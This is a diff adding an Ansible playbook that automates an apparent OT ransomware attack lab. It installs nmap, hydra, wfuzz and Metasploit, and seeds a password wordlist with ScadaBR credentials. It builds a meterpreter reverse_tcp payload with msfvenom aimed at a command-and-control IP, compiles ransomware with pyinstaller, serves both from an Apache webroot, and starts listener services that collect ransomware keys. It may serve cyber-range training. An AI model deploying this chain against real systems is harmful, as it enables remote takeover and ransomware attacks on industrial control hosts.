@@ -1,0 +1,269 @@
+---
+- name: Get all host facts
+  hosts: all
+  gather_facts: true
+
+- name: Remove artefacts on hmi
+  hosts: hmi
+  tasks:
+    - name: Get facts from attacker
+      ansible.builtin.set_fact:
+        exploit_filename: "{{ hostvars['attacker_0'].exploit_filename }}"
+        ransomware_payload: "{{ hostvars['attacker_0'].ransomware_payload }}"
+
+    - name: Stop service
+      become: true
+      ansible.builtin.systemd:
+        name: "{{ exploit_filename }}@hmi"
+        state: stopped
+        enabled: false
+      failed_when: false
+
+    - name: Create attack directory
+      become: true
+      ansible.builtin.file:
+        path: "{{ item }}"
+        state: absent
+      loop:
+        - /usr/bin/{{ exploit_filename }}
+        - /tmp/{{ ransomware_payload }}
+
+- name: Install essential software for malware hosts
+  hosts: ransomware
+  tasks:
+    - name: Create attack directory
+      become: true
+      ansible.builtin.file:
+        path: /opt/ot_attack/
+        state: directory
+        mode: "0755"
+
+    - name: Update apt cache
+      become: true
+      ansible.builtin.apt:
+        update_cache: true
+        cache_valid_time: 3600
+
+    - name: Install basic software
+      become: true
+      ansible.builtin.apt:
+        name: [nmap, wfuzz, hydra, ncat, libxcb-image0, python3-tk, python3-pip]
+        state: present
+
+    - name: Uninstall crypto and pycrypto
+      become: true
+      ansible.builtin.pip:
+        name: [crypto, pycrypto]
+        state: absent
+
+    - name: Install pycryptodome
+      become: true
+      ansible.builtin.pip:
+        name: [pycryptodome, pyinstaller, shodan, BeautifulSoup4]
+        state: present
+
+    - name: Add passwords to wfuzz
+      become: true
+      ansible.builtin.lineinfile:
+        path: /usr/share/wfuzz/wordlist/general/common.txt
+        line: "{{ item }}"
+        state: present
+      with_items:
+        - ScadaBR
+        - ap2021dias
+
+    - name: Download metasploit installer msfinstall
+      become: true
+      ansible.builtin.get_url:
+        url: https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb
+        dest: /tmp/msfinstall
+        mode: "0755"
+
+    # TODO: Use attack/bootstrap 
+    - name: Install Metasploit via msfinstall
+      become: true
+      ansible.builtin.shell: snap install metasploit-framework
+# - name: Install Metasploit via msfinstall
+#   become: true
+#   ansible.builtin.command:
+#     cmd: /tmp/msfinstall
+# changed_when: false
+# failed_when: false
+
+- name: Attacker 0
+  hosts: attacker_0
+  tasks:
+    - name: Copy Attack chain
+      become: true
+      ansible.builtin.copy:
+        src: attacker_0/ncat.sh
+        dest: /opt/ot_attack/ncat.sh
+        mode: "0755"
+
+    - name: Nmap service
+      become: true
+      ansible.builtin.copy:
+        src: attacker_0/auto-ncat.service
+        dest: /lib/systemd/system/auto-ncat.service
+
+    - name: Reload systemd and start nmap
+      become: true
+      ansible.builtin.systemd:
+        daemon_reload: true
+        name: auto-ncat
+        state: started
+
+    - name: Manage ncat output file
+      become: true
+      ansible.builtin.file:
+        dest: /opt/ot_attack/ransomw-keys.txt
+        mode: "0666"
+        state: touch
+
+- name: Attacker 1 Setup
+  hosts: attacker_1
+  tasks:
+    - name: Install apache
+      become: true
+      ansible.builtin.apt:
+        name: [apache2]
+        state: present
+
+    - name: Ensure apache is running
+      become: true
+      ansible.builtin.systemd:
+        name: apache2
+        state: started
+
+    - name: Remove artefacts from webroot
+      become: true
+      ansible.builtin.file:
+        path: /var/www/html/{{ item }}
+        state: absent
+      loop:
+        - "{{ exploit_filename }}"
+        - "{{ ransomware_payload }}"
+
+    - name: Copy Attack chain
+      become: true
+      ansible.builtin.copy:
+        src: attacker_1/
+        dest: /opt/ot_attack/
+
+    - name: Change lockscreen color
+      become: true
+      ansible.builtin.replace:
+        path: /opt/ot_attack/ransomware/gui.py
+        regexp: "#722020"
+        replace: "{{ ransomware_data.ransomware_lockscreen_bg_color }}"
+      when: ransomware_data.ransomware_lockscreen_bg_color is defined
+
+    - name: Deploy msf-loader
+      become: true
+      ansible.builtin.template:
+        dest: /opt/ot_attack/msf-loader
+        src: msf-loader.j2
+        mode: "0644"
+
+    - name: Deploy autoexec
+      become: true
+      ansible.builtin.template:
+        dest: /opt/ot_attack/autoexec
+        src: autoexec.j2
+        mode: "0644"
+
+    - name: Write Ransomware Config
+      become: true
+      ansible.builtin.copy:
+        content: "{{ ransomware_data | to_nice_yaml(indent=4) }}"
+        dest: /opt/ot_attack/data.yml
+        mode: "0644"
+
+    - name: Create exploit via msfvenom
+      become: true
+      vars:
+        exploit_path: /opt/ot_attack/{{ exploit_filename }}
+      ansible.builtin.shell:
+        cmd: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={{ attacker_cc_metasploit_ip_lanturtle }} LPORT={{ attacker_cc_port_lanturtle }} -f elf > {{ exploit_path
+          }}
+        chdir: /opt/ot_attack/
+      changed_when: false
+
+    - name: Copy exploit to apache webroot
+      become: true
+      ansible.builtin.copy:
+        src: /opt/ot_attack/{{ exploit_filename }}
+        dest: /var/www/html/{{ exploit_filename }}
+        remote_src: true
+
+    - name: Create ransomware via pyinstaller
+      become: true
+      ansible.builtin.command:
+        cmd: pyinstaller -F -n ransomware --clean --add-data 'data.yml:.' -p . -y ransomware/__main__.py
+        chdir: /opt/ot_attack/
+      changed_when: false
+
+    - name: Copy exploit to apache webroot
+      become: true
+      ansible.builtin.copy:
+        src: /opt/ot_attack/dist/ransomware
+        dest: /var/www/html/{{ ransomware_payload }}
+        remote_src: true
+
+    - name: Metasploit attacker service
+      become: true
+      ansible.builtin.template:
+        src: metasploit-attacker.service.j2
+        dest: /lib/systemd/system/metasploit-attacker.service
+
+    - name: Reload systemd and start metasploit-attacker
+      become: true
+      ansible.builtin.systemd:
+        daemon_reload: true
+        name: metasploit-attacker
+        state: started
+
+- name: Lanturtle
+  hosts: lanturtle
+  tasks:
+    - name: Deploy victim script
+      become: true
+      ansible.builtin.template:
+        dest: /opt/ot_attack/attack.sh
+        src: victim/attack.sh.j2
+        mode: "0644"
+
+    - name: Deploy IP Targets
+      become: true
+      ansible.builtin.template:
+        dest: /opt/ot_attack/ip-targets.txt
+        src: ip-targets.txt.j2
+        mode: "0644"
+
+    - name: Deploy Web Targets
+      become: true
+      ansible.builtin.template:
+        dest: /opt/ot_attack/web-targets.txt
+        src: web-targets.txt.j2
+        mode: "0644"
+
+    - name: Deploy attacker commands
+      become: true
+      ansible.builtin.template:
+        dest: /opt/ot_attack/commands.txt
+        src: commands.txt.j2
+        mode: "0644"
+
+    - name: Copy Attack chain
+      become: true
+      ansible.builtin.copy:
+        src: lanturtle/
+        dest: /opt/ot_attack/
+        mode: "0755"
+
+    - name: Deploy attacker config
+      become: true
+      ansible.builtin.template:
+        dest: /opt/ot_attack/config
+        src: config.j2
+        mode: "0644"
